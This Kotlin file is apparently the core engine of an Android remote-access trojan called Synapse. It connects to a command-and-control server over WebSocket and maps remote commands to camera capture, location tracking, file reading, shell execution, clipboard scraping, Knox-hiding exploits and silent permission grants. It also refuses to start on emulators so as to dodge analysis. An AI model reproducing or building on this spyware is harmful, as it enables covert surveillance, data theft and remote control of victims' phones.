package org.synapse.core.core

import android.content.Context
import android.provider.Settings
import android.util.Log
import org.synapse.core.c2.C2Coordinator
import org.synapse.core.c2.Command
import org.synapse.core.modules.CameraModule
import org.synapse.core.modules.ClipboardModule
import org.synapse.core.modules.FileModule
import org.synapse.core.modules.KnoxGuardModule
import org.synapse.core.modules.KnoxHideExploit
import org.synapse.core.modules.LocationModule
import org.synapse.core.modules.SemClipboardExploit
import org.synapse.core.modules.ShellModule
import org.synapse.core.modules.SilentPermissionGrant

object SynapseEngine {
    private const val TAG = "Synapse"
    private const val DEFAULT_C2 = "wss://192.168.1.9:8443/c2"
    private var started = false

    fun start(context: Context) {
        if (started) return
        started = true

        if (!SandboxDetector.isRealDevice(context)) {
            Log.w(TAG, "Sandbox/emulator detected — refusing to start engine")
            return
        }

        // Sandbox analysis check disabled for testing
        // if (SandboxDetector.looksLikeAnalysis()) {
        //     Log.w(TAG, \"Analysis environment detected — sleeping\")
        //     Thread.sleep(3600_000)
        //     return
        // }

        val deviceId = getDeviceId(context)
        val prefs = context.getSharedPreferences("synapse_prefs", Context.MODE_PRIVATE)
        val c2Url = prefs.getString("c2_base_url", DEFAULT_C2) ?: DEFAULT_C2
        val fcmToken = prefs.getString("fcm_token", null)

        prefs.edit().putString("device_id", deviceId).apply()

        val handlers: Map<String, suspend (Command) -> SynapseResponse> = mapOf(
            "ping"     to { cmd -> SynapseResponse.PingResponse(pong = true, latency_ms = 0) },
            "info"     to { cmd -> InfoModule.gather(context) },
            "camera"   to { cmd -> CameraModule.capture(context, cmd) },
            "location" to { cmd -> LocationModule.get(context, cmd) },
            "files"    to { cmd -> FileModule.list(context, cmd) },
            "file_read" to { cmd -> FileModule.read(context, cmd) },
            "shell"    to { cmd -> ShellModule.exec(cmd) },
            "clipboard" to { cmd -> try { ClipboardModule.scrape(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("clipboard:${e.message}", "clipboard") } },
            "clipboard_image" to { cmd -> try { ClipboardModule.readImage(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("clipboard_img:${e.message}", "clipboard") } },
            "knox_hide" to { cmd -> try { KnoxGuardModule.hide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_hide:${e.message}", "knox_guard") } },
            "knox_unhide" to { cmd -> try { KnoxGuardModule.unhide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_unhide:${e.message}", "knox_guard") } },
            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_check:${e.message}", "knox_guard") } },
            "semclipboard" to { cmd -> try { SemClipboardExploit.scrape(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("semclipboard:${e.message}", "semclipboard") } },
            "knox_hide_v2" to { cmd -> try { KnoxHideExploit.hide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_hide_v2:${e.message}", "knox_hide_v2") } },
            "knox_unhide_v2" to { cmd -> try { KnoxHideExploit.unhide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_unhide_v2:${e.message}", "knox_hide_v2") } },
            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("silent_grant:${e.message}", "silent_grant") } }
        )

        C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
        Log.d(TAG, "Engine started — device=$deviceId")
    }

    fun stop() {
        C2Coordinator.stop()
        started = false
    }

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: android.os.Build.getSerial()
    }
}
